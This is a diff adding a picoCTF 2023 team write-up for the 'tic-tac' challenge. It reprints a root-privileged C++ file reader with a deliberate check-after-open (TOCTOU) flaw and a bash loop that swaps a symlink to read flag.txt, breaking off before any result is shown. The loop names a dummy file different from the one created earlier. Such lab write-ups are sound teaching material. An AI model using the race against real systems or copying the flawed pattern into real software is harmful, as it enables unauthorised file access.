@@ -21,9 +21,89 @@ A list of writeups from the 2023 PicoCTF hacking competition from team cvhs_exe.
 	
 </details>
 
-<details><summary>
+
+# Binary Exploit
+
+(Add the stuff yall did as well)
 
 
-# [Binary Exploit]
+## tic-tac 
+#### [View Question in Pico Gym](https://play.picoctf.org/practice/challenge/380?category=6&originalEvent=72&page=1)
+
+AUTHOR: JUNIAS BONOU
+
+### Description:
+
+Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.
+
+SSH to `saturn.picoctf.net`, port `[port provided by instance]`, and run the binary named `txtreader` once connected. Login as `ctf-player` with the password, `[password provided by instance]`
+
+Tags: picoCTF 2023, Binary Exploitation, linux, bas, toctou
+
+Hints: 
+- None.
+
+### Solution: 
+
+Upon loading up to the ssh, we looked at 3 useful files with `ls`: 
+```
+flag.txt  src.cpp  txtreader
+```
+
+As expected, we didn't have access to `flag.txt`. `txtreader` didn't let us open it either, so we peeked in the source code provided.
+```
+#include <iostream>
+#include <fstream>
+#include <unistd.h>
+#include <sys/stat.h>
+
+int main(int argc, char *argv[]) {
+  if (argc != 2) {
+    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
+    return 1;
+  }
+
+  std::string filename = argv[1];
+  std::ifstream file(filename);
+  struct stat statbuf;
+
+  // Check the file's status information.
+  if (stat(filename.c_str(), &statbuf) == -1) {
+    std::cerr << "Error: Could not retrieve file information" << std::endl;
+    return 1;
+  }
+
+  // Check the file's owner.
+  if (statbuf.st_uid != getuid()) {
+    std::cerr << "Error: you don't own this file" << std::endl;
+    return 1;
+  }
+
+  // Read the contents of the file.
+  if (file.is_open()) {
+    std::string line;
+    while (getline(file, line)) {
+      std::cout << line << std::endl;
+    }
+  } else {
+    std::cerr << "Error: Could not open file" << std::endl;
+    return 1;
+  }
+
+  return 0;
+}
+
+```
+
+As said in the name and tags, there's a [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) vulnerability, where the file is opened before it checks for permissions when the file is read. This is easily exploitable through a handy dandy feature called [symbolic links](https://en.wikipedia.org/wiki/Symbolic_link). A symbolic link to a file is created with this command `ln -s [original file] [linked file]`. You may need to change `-s` to `-sf` to force it if the file exists.
+
+Through this, we create our own file which we have permissions to read to with `echo OurFile > notflag.txt`. 
+
+Then, we write a bash one-liner to create a link file and swap the linkage to the file between the flag and our dummy file. This way, we can change the ownership of the file right after it's opened and read into the memory of the program.
+```
+while true; do ln -sf flag.txt linky; ln -sf file.txt linky; done &
+```
+
+This will run in the background.
 
 
